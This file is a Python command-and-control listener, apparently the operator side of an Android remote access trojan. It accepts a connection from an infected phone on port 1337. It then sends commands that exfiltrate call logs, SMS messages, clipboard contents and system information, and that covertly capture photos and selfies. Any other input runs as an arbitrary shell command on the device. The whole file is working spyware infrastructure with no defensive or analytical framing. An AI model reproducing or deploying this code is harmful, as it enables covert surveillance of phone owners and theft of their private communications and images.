#!/usr/bin/env python3

import os
import socket
import base64
import datetime

HOST = '0.0.0.0'
PORT = 1337
END_HEADER = "POPPETX321"

server_soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_soc.bind((HOST, PORT))
server_soc.listen(1)
print("Listening for connections on " + str(server_soc))

conn, addr = server_soc.accept()
print("Connection from " + str(addr))
connectionTest = conn.recv(4048).decode("UTF-8")
print("From " + str(addr) + " : " + str(connectionTest))

# Just some function to be used here and there
def recvall(sock):
    data = ""
    buffer = ""
    while END_HEADER not in data:
        buffer = sock.recv(4048).decode("UTF-8", "ignore")
        data += buffer
    data.replace(END_HEADER, "")
    return data

while True:
    dataSend = input(">>>") + "\n"
    print("Executing command.. "+dataSend)

    if dataSend.strip() == "end":
        conn.send(dataSend.encode("UTF-8"))
        conn.close()
        break

    elif dataSend.strip() == "getCallLogs":
        conn.send(dataSend.encode("utf-8"))
        print(str(recvall(conn)))

    elif dataSend.strip() == "takePhoto":
        conn.send(dataSend.encode("utf-8"))
        file = open("Photo" + str(datetime.datetime.now()) + ".png", "wb")
        file.write(base64.b64decode(recvall(conn)))
        file.close()
        print("Done...")

    elif dataSend.strip() == "takeSelfie":
        conn.send(dataSend.encode("utf-8"))
        file = open("Selfie" + str(datetime.datetime.now()) + ".png", "wb")
        file.write(base64.b64decode(recvall(conn)))
        file.close()
        print("Done...")

    elif dataSend.strip() == "getSystemInfo":
        conn.send(dataSend.encode("UTF-8"))
        print("System Info of " + str(addr) + "\n" + str(recvall(conn)))

    elif dataSend.strip() == "getMessages":
        conn.send(dataSend.encode("UTF-8"))
        print("Writing it to messages.txt")
        file = open("message.txt", 'a')
        file.write("--------------------------------------\n")
        messages_data = recvall(conn)
        file.write(base64.b64decode(messages_data).decode("utf-8"))
        file.close()
        print("Done...")

    elif dataSend.strip() == "getClipBoardContent":
        conn.send(dataSend.encode("utf-8"))
        print(str(recvall(conn)))
#        //TODO Needs a fix on Android Code.

    else:
        conn.send(dataSend.encode("utf-8"))
        print(conn.recv(4048).decode("utf-8"))

conn.close()
